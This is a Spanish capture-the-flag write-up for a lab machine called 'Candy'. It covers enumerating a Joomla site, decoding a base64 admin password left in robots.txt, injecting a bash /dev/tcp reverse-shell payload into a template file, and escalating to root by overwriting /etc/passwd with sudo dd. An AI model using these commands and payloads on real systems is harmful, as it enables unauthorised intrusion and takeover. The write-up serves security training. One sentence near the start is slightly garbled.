
## 1. Reconocimiento Inicial con Nmap

Realizamos un escaneo exhaustivo con `nmap` para detectar puertos abiertos, sus versiones y el sistemosibles vulnerabilidadea operativo. Esto nos proporciona una visión general de los servicios expuestos y ps asociadas a sus versiones.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `80/tcp open http Apache httpd 2.4.58`: El puerto 80 está abierto y ejecuta un servidor web Apache. La información adicional (`Joomla! - Open Source Content Management`) es crucial, ya que identifica el CMS (Sistema de Gestión de Contenidos) utilizado.
*   `http-robots.txt`: Nmap también detecta la presencia de un archivo `robots.txt` y lista varias entradas `Disallow`, lo que sugiere directorios y archivos que los rastreadores web no deberían indexar, pero que pueden ser interesantes para un atacante.

### 1.2. Análisis de la Página Web con WhatWeb

Utilizamos `whatweb` para obtener más información sobre la tecnología utilizada en la página web. Esta herramienta escaneará la URL y reportará tecnologías, versiones y otros detalles.

```bash
whatweb http://<IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   Confirma el uso de `Joomla! - Open Source Content Management`.
*   Identifica el servidor Apache y su versión.
*   Muestra un posible nombre de usuario o pista en el atributo `alt` de una imagen: `TLuisillo_o` (`<img src="/media/templates/site/cassiopeia/images/logo.svg" alt="TLuisillo_o" class="logo d-inline-block">`). Esta es una pista importante para futuras fases.

## 2. Enumeración Web y Descubrimiento de Credenciales

Con la identificación de Joomla! y la pista del `robots.txt`, profundizamos en la enumeración web para encontrar información sensible.
![[Candy.png]]
### 2.1. Fuzzing Web con Gobuster

Realizamos un fuzzing de directorios con `gobuster` para descubrir rutas ocultas o archivos interesantes en el servidor web. Esto nos ayuda a mapear la estructura del sitio y encontrar posibles puntos de entrada.

```bash
gobuster dir -w /path/to/wordlist/directory-list-2.3-medium.txt -u http://<IP_DEL_OBJETIVO> -x php,html,txt
```

**Resultados Relevantes:**

*   `/administrator`: Este directorio es crucial, ya que es la interfaz de administración de Joomla!.
*   `/un_caramelo`: Un directorio inusual que podría contener información.
*   `/robots.txt`: Confirmado por Nmap, este archivo es de particular interés.

### 2.2. Análisis de `robots.txt`

El archivo `robots.txt` es un archivo de texto que los sitios web utilizan para indicar a los rastreadores de motores de búsqueda qué páginas o archivos no deben rastrear. Sin embargo, para un atacante, estas entradas `Disallow` pueden ser una lista de directorios y archivos interesantes que el administrador no quiere que sean públicos.

Al examinar el contenido de `http://<IP_DEL_OBJETIVO>/robots.txt`, encontramos una línea inesperada al final:

```bash
admin:c2FubHVpczEyMzQ1
```

Esta cadena parece ser una credencial. La parte `c2FubHVpczEyMzQ1` es una cadena codificada.

### 2.3. Decodificación de Credenciales

La cadena `c2FubHVpczEyMzQ1` tiene el formato de una codificación Base64. La decodificamos para revelar la contraseña.

```bash
echo "c2FubHVpczEyMzQ1" | base64 -d
# sanluis12345
```

Ahora tenemos un par de credenciales: `admin:sanluis12345`.

## 3. Acceso al Panel de Administración de Joomla!

Con las credenciales obtenidas, intentamos iniciar sesión en el panel de administración de Joomla!.
![[Candy_InicioSesión.png]]
### 3.1. Inicio de Sesión en `/administrator`

Accedemos a la URL `http://<IP_DEL_OBJETIVO>/administrator/index.php` e intentamos iniciar sesión con las credenciales `admin:sanluis12345`. El inicio de sesión es exitoso, lo que nos da acceso al panel de administración de Joomla!.

### 3.2. Identificación de la Versión de Joomla!

Dentro del panel de administración, podemos identificar la versión de Joomla! instalada, que es `4.1.2`. Conocer la versión es importante para buscar exploits específicos para esa versión, aunque en este caso, la explotación se realizará a través de una funcionalidad legítima del CMS.

## 4. Obtención de Reverse Shell (RCE)

El objetivo ahora es obtener una shell inversa en la máquina objetivo. En Joomla!, si tenemos acceso al panel de administración, a menudo podemos modificar plantillas o extensiones para inyectar código PHP que nos dé una shell.

### 4.1. Modificación de Plantilla para Ejecución de Comandos

Navegamos a `System -> Site Templates` y seleccionamos la plantilla activa (por ejemplo, `Cassiopeia`). Editamos el archivo `index.php` de la plantilla. Este archivo se ejecuta cada vez que se carga una página del sitio web.

Para verificar la ejecución de comandos, podemos añadir una línea simple como `system('whoami');`.

```php
<?php
// ... código existente ...
system('whoami'); // Añadimos esta línea para probar la ejecución de comandos
// ... más código existente ...
?>
```
![[Candy_whoami.png]]

Al guardar y recargar la página principal del sitio, deberíamos ver el resultado del comando `whoami` (por ejemplo, `www-data`), confirmando que podemos ejecutar comandos en el servidor web.

### 4.2. Ejecución de Reverse Shell

Una vez confirmada la ejecución de comandos, reemplazamos el comando `system('whoami');` con un payload de reverse shell. Este payload hará que el servidor se conecte a nuestra máquina atacante, dándonos una shell interactiva.

**Payload de Reverse Shell (PHP):**

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_DE_TU_KALI>/443 0>&1'");
```

*   `exec()`: Función de PHP para ejecutar comandos externos.
*   `/bin/bash -c '...'`: Ejecuta un comando bash.
*   `bash -i`: Inicia una shell interactiva.
*   `>& /dev/tcp/<IP_DE_TU_KALI>/443`: Redirige la entrada y salida estándar a una conexión TCP a la IP de nuestra máquina atacante en el puerto 443.

**En la Máquina Atacante:**

Antes de recargar la página, configuramos un `netcat` listener en nuestra máquina atacante para recibir la conexión entrante en el puerto 443.

```bash
nc -lvnp 443
```

Después de configurar el listener, recargamos la página web de Joomla! en el navegador. Esto ejecutará el código PHP inyectado y nos dará una shell inversa en nuestra máquina atacante.

```bash
www-data@<ID_DEL_CONTENEDOR>:/var/www/html/joomla$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmamos que estamos como el usuario `www-data`.

### 4.3. Tratamiento de la TTY (Opcional pero Recomendado)

Para una mejor interacción con la shell (autocompletado, historial, etc.), es recomendable convertirla en una TTY (terminal) interactiva. Esto se logra con los siguientes comandos:

1.  **Ejecutar `script`:**
    ```bash
    script /dev/null -c bash
    ```
2.  **Suspender el proceso:**
    ```bash
    Ctrl + Z
    ```
3.  **Configurar la terminal:**
    ```bash
    stty raw -echo; fg
    ```
4.  **Restablecer la terminal:**
    ```bash
    reset
    ```
5.  **Especificar tipo de terminal (si se pregunta):**
    ```bash
    xterm
    ```
6.  **Exportar variables de entorno:**
    ```bash
    export TERM=xterm
    export SHELL=bash
    ```

## 5. Escalada de Privilegios

Una vez que tenemos una shell como `www-data`, el objetivo es escalar privilegios a `root`.

### 5.1. Búsqueda de Binarios SUID y Permisos Sudo

Primero, verificamos si el usuario `www-data` puede ejecutar comandos con `sudo` sin contraseña (`sudo -l`). En este caso, nos pide contraseña, lo que significa que no hay una configuración `NOPASSWD` directa para `www-data`.

Luego, buscamos binarios con el bit SUID (`find / -perm -4000 2>/dev/null`). Estos binarios se ejecutan con los permisos del propietario, lo que puede ser una vía para escalar privilegios si el propietario es `root`.

```bash
find / -perm -4000 2>/dev/null
```

En este ejercicio, los binarios SUID comunes no ofrecen una vía directa de escalada, lo que nos lleva a buscar otras pistas.

### 5.2. Búsqueda de Archivos Sensibles

Buscamos archivos ocultos o sensibles que puedan contener credenciales o información útil. Una búsqueda común es la de archivos `.txt`.

```bash
find / -name *.txt 2>/dev/null
```

Esto nos lleva a un archivo sospechoso: `/var/backups/hidden/otro_caramelo.txt`.

### 5.3. Análisis de `otro_caramelo.txt`

Al examinar el contenido de `otro_caramelo.txt`, encontramos un fragmento de código PHP que contiene credenciales de base de datos:

```php
<?php
// Información sensible
$db_host = 'localhost';
$db_user = 'luisillo';
$db_pass = 'luisillosuperpassword';
$db_name = 'joomla_db';

// ... más código ...
?>
```

¡Hemos encontrado nuevas credenciales! `luisillo:luisillosuperpassword`.

### 5.4. Movimiento Lateral a `luisillo`

Consultamos el archivo `/etc/passwd` (que ya habíamos visto en la fase de RCE) y confirmamos la existencia del usuario `luisillo`. Intentamos cambiar de usuario a `luisillo` con la contraseña encontrada.

```bash
su luisillo
# Contraseña: luisillosuperpassword
```

Si es exitoso, ahora estamos como el usuario `luisillo`.

### 5.5. Verificación de Permisos Sudo para `luisillo`

Como el usuario `luisillo`, volvemos a verificar los permisos `sudo`.

```bash
sudo -l
```

**Resultados Clave:**

*   `(ALL) NOPASSWD: /bin/dd`

Esto significa que el usuario `luisillo` puede ejecutar el binario `/bin/dd` como cualquier usuario (incluido `root`) sin necesidad de introducir su contraseña. El comando `dd` es una herramienta de bajo nivel para copiar y convertir archivos, y puede ser abusado para escribir en archivos del sistema con privilegios elevados.

### 5.6. Escalada a Root con `dd`

La técnica para escalar privilegios con `dd` cuando tiene permisos `NOPASSWD` en `sudo` implica modificar el archivo `/etc/passwd` para eliminar la contraseña del usuario `root`. Esto nos permitirá iniciar sesión como `root` sin contraseña.

1.  **Crear una copia de seguridad de `/etc/passwd`:** Esto es crucial para poder restaurar el archivo si algo sale mal.

    ```bash
    cat /etc/passwd > passwdBackup
    ```

2.  **Modificar la copia de seguridad:** Editamos `passwdBackup` para eliminar la `x` de la entrada de `root`. La línea `root:x:0:0:root:/root:/bin/bash` debe convertirse en `root::0:0:root:/root:/bin/bash`.

3.  **Sobrescribir `/etc/passwd` con `dd`:** Utilizamos `dd` para copiar el contenido de nuestro archivo modificado (`passwdBackup`) sobre el archivo original `/etc/passwd` con permisos de `root`.

    ```bash
    LFILE=/etc/passwd
    cat passwdBackup | sudo dd of=$LFILE
    ```

    Esto sobrescribirá el archivo `/etc/passwd` del sistema con nuestra versión modificada, eliminando la contraseña de `root`.

4.  **Cambiar a `root`:** Ahora, podemos usar el comando `su -` (que intenta iniciar sesión como `root` por defecto) y no nos pedirá contraseña.

    ```bash
    su -
    ```

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```
